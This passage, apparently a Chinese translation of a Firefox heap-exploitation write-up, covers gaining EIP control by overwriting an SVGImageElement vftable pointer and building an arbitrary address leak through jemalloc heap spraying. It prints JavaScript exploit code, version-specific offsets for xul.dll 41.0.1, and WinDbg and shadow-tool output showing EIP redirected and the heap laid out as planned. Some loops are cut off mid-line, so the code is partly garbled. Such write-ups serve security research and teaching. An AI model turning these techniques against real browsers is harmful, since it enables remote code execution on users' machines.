为了获得EIP控制，我们可以简单地覆盖SVGImageElement对象的vftable指针，然后调用其中一个方法。
我们必须在泄漏的SVGImageElement对象地址中添加或减去的确切值取决于我们调用的方法（以及xul.dll的版本）。
    var obj_addr = \
            parseInt(val_hex[0], 16); // our location in memory, see above
        var deref_addr = obj_addr - 0x1f4 + 0x4; // 41.0.1 specific
        var target_eip = "41424344";
        var write_val_bytes = \
            hex_to_bytes(target_eip + deref_addr.toString(16));
        var write_val_double = bytes_to_double(write_val_bytes);
        container[pwned_index][30] = write_val_double;
        log("[*] calling a method of the corrupted SVGImageElement object");
        for(var i = 0; i  dd 15b11300 l?80
        [ Corrupted metadata of an ArrayObject ]
                  flags    initlen  capacity length
        15b11300  00000000 00000666 00000666 00000666
                  [    index 0    ] [   index 1     ]
        15b11310  45464645 ffffff81 47484847 ffffff81
                  [    index 2    ] [   index 3     ]
        15b11320  45464645 ffffff81 47484847 ffffff81
        ...
        15b113c0  45464645 ffffff81 47484847 ffffff81
        15b113e0  45464645 ffffff81 47484847 ffffff81
                  [    index 28   ] [   index 29    ]
        15b113f0  45464645 ffffff81 47484847 ffffff81
                  [    index 30   ] [   index 31    ]
        15b11400  15b11210 41424344 1a590ea0 00000000
        15b11410  11bfc830 00000000 00020008 00000000
                                    [   index 35    ]
        15b11420  00000000 00000000 15b11400 00000000
        15b11430  00000007 00000000 00090000 00000000
        ...
        15b114e0  e4000201 00000000 00000000 e4010301
        15b114f0  06000106 00000001 00000000 e5e50000
        0:000> g
        [*] calling a method of the corrupted SVGImageElement object
        (1084.a60): Access violation - code c0000005 (first chance)
        First chance exceptions are reported before any exception handling.
        This exception may be expected and handled.
        eax=15b11210 ebx=00000001 ecx=15b11400 edx=00000006 esi=1160b8b0
        edi=15b11400 eip=41424344 esp=0032d2f0 ebp=0032d520 iopl=0
        nv up ei pl zr na pe nc
        cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b  efl=00010246
        41424344 je  41424346                                         [br=1]
我们控制了EIP，知道xul.dll的基地址，并且可以在已知地址的堆上放置任意内容，因此在这一点上我们很简单地通过ROP来解决任何问题。
有关完整代码，请参阅文件'svg-eip-control.html'。
## 5.5 任意地址泄漏
我们已经完全控制了Firefox进程，现在我们看看如何对jemalloc堆进行更细微控制。为了演示如何详细操作jemalloc，我将描述如何从任意地址读取任意数量的字节，即任意地址泄漏。
为此，将使用构造的（即假的）非内联字符串。为了能够从这个伪字符串读回，还需要创建一个伪字符串类型jsval，指向伪非内联字符串，并通过损坏的ArrayObject索引此jsval。这种方法的问题是损坏的ArrayObject不能用于编写伪字符串类型的jsval（或任何其他jsval）;请记住，没有IEEE-754
64位双精度对应于大于0xFFF00000的32位编码值。为了创建一个假的jsval字符串，我们需要编写ffffff85作为其标记值。
因此，我们需要找到另一种在受控内存中构造伪字符串类型jsval的方法。 我们可以使用的是jemalloc的可靠性和LIFO操作，以创建更复杂的堆排序。
具体来说，我将在方法中添加类型化数组以利用其完全受控的内容。
虽然，正如我们所看到的，无法将类型化数组的元数据放在可由用户控制的数据访问的内存中，但是类型化数组的实际数据（可控制到单字节）可以放在jemalloc运行中。
我们首先使用ArrayObjects喷涂256个大小的jemalloc运行。 同样，我们必须绕过 nursery
并将我们的对象移动到jemalloc，因此我们的堆喷大小是16777216/256 == 65536：
    var spray_size = 66000;
        var container = new Array();
        for(var i = 0; i  !py c:\tmp\pykd_driver jeruns -s 256
        [shadow] listing allocated non-current runs for size class 256
        [shadow] [total non-current runs 446]
        [shadow] [run 0x0e507000] [size 016384] [bin 0x00700608]
            [region size 0256] [total regions 0063] [free regions 0000]
        ...
        [shadow] [run 0x11d03000] [size 016384] [bin 0x00700608]
            [region size 0256] [total regions 0063] [free regions 0042]
        [shadow] [run 0x15f09000] [size 016384] [bin 0x00700608]
            [region size 0256] [total regions 0063] [free regions 0042]
        [shadow] [run 0x15f0d000] [size 016384] [bin 0x00700608]
            [region size 0256] [total regions 0063] [free regions 0042]
        [shadow] [run 0x15f11000] [size 016384] [bin 0x00700608]
            [region size 0256] [total regions 0063] [free regions 0042]
        [shadow] [run 0x15f15000] [size 016384] [bin 0x00700608]
            [region size 0256] [total regions 0063] [free regions 0042]
        [shadow] [run 0x15f19000] [size 016384] [bin 0x00700608]
            [region size 0256] [total regions 0063] [free regions 0042]
        ...
用shadow 观察其中一个（随机）run ，我们看到：
    0:000> !py c:\tmp\pykd_driver jerun 0x15f15000
        [shadow] searching for run 0x15f15000
        [shadow] [run 0x15f15000] [size 016384] [bin 0x00700608]
            [region size 0256] [total regions 0063] [free regions 0042]
        [shadow] [region 000] [free] [0x15f15100] [0xe5e5e5e5]
        [shadow] [region 001] [free] [0x15f15200] [0xe5e5e5e5]
        [shadow] [region 002] [used] [0x15f15300] [0x0]
        [shadow] [region 003] [free] [0x15f15400] [0xe5e5e5e5]
        [shadow] [region 004] [free] [0x15f15500] [0xe5e5e5e5]
        [shadow] [region 005] [used] [0x15f15600] [0x0]
        [shadow] [region 006] [free] [0x15f15700] [0xe5e5e5e5]
        [shadow] [region 007] [free] [0x15f15800] [0xe5e5e5e5]
        [shadow] [region 008] [used] [0x15f15900] [0x0]
        [shadow] [region 009] [free] [0x15f15a00] [0xe5e5e5e5]
        [shadow] [region 010] [free] [0x15f15b00] [0xe5e5e5e5]
我们的安排的空洞的内存位置成功了，就是图中 0x0 的部分。 请记住，0xe5e5e5e5是Firefox用于清除释放的jemalloc区域的值。  
我们现在在jemalloc堆上回收这些空洞的内存，每个ArrayObject后面有一个SVGImageElement对象和一个Uint32Array类型数组。
我们确保这个类型化数组的内容大小为256字节，这样就命中上述jemalloc run。 此时，类型化数组的实际内容无关紧要。
    for(var i = 0; i  !py c:\tmp\pykd_driver jerun 0x15f15000
        [shadow] searching for run 0x15f15000
        [shadow] [run 0x15f15000] [size 016384] [bin 0x00700608]
            [region size 0256] [total regions 0063] [free regions 0000]
        [shadow] [region 000] [used] [0x15f15100] [0x69e0cf70]
        [shadow] [region 001] [used] [0x15f15200] [0x51575751]
        [shadow] [region 002] [used] [0x15f15300] [0x0]
        [shadow] [region 003] [used] [0x15f15400] [0x69e0cf70]
        [shadow] [region 004] [used] [0x15f15500] [0x51575751]
        [shadow] [region 005] [used] [0x15f15600] [0x0]
        [shadow] [region 006] [used] [0x15f15700] [0x69e0cf70]
        [shadow] [region 007] [used] [0x15f15800] [0x51575751]
        [shadow] [region 008] [used] [0x15f15900] [0x0]
        [shadow] [region 009] [used] [0x15f15a00] [0x69e0cf70]
        [shadow] [region 010] [used] [0x15f15b00] [0x51575751]
        ...
        [shadow] [region 014] [used] [0x15f15f00] [0x0]
        [shadow] [region 015] [used] [0x15f16000] [0x69e0cf70]
        [shadow] [region 016] [used] [0x15f16100] [0x51575751]
        0:000> dd 0x15f15f00 l?90
        [ ArrayObject ]
        15f15f00  00000000 0000001e 0000001e 0000001e
        15f15f10  45464645 ffffff81 47484847 ffffff81
        15f15f20  45464645 ffffff81 47484847 ffffff81
        15f15f30  45464645 ffffff81 47484847 ffffff81
        15f15f40  45464645 ffffff81 47484847 ffffff81
        15f15f50  45464645 ffffff81 47484847 ffffff81
        15f15f60  45464645 ffffff81 47484847 ffffff81
        15f15f70  45464645 ffffff81 47484847 ffffff81
        15f15f80  45464645 ffffff81 47484847 ffffff81
        15f15f90  45464645 ffffff81 47484847 ffffff81
        15f15fa0  45464645 ffffff81 47484847 ffffff81
        15f15fb0  45464645 ffffff81 47484847 ffffff81
        15f15fc0  45464645 ffffff81 47484847 ffffff81
        15f15fd0  45464645 ffffff81 47484847 ffffff81
        15f15fe0  45464645 ffffff81 47484847 ffffff81
        15f15ff0  45464645 ffffff81 47484847 ffffff81
        [ SVGImageElement ]
        15f16000  69e0cf70 69e0eba0 1652da20 00000000
        15f16010  0d863c90 00000000 00020008 00000000
        15f16020  00000000 00000000 15f16000 00000000
        15f16030  00000007 00000000 00090000 00000000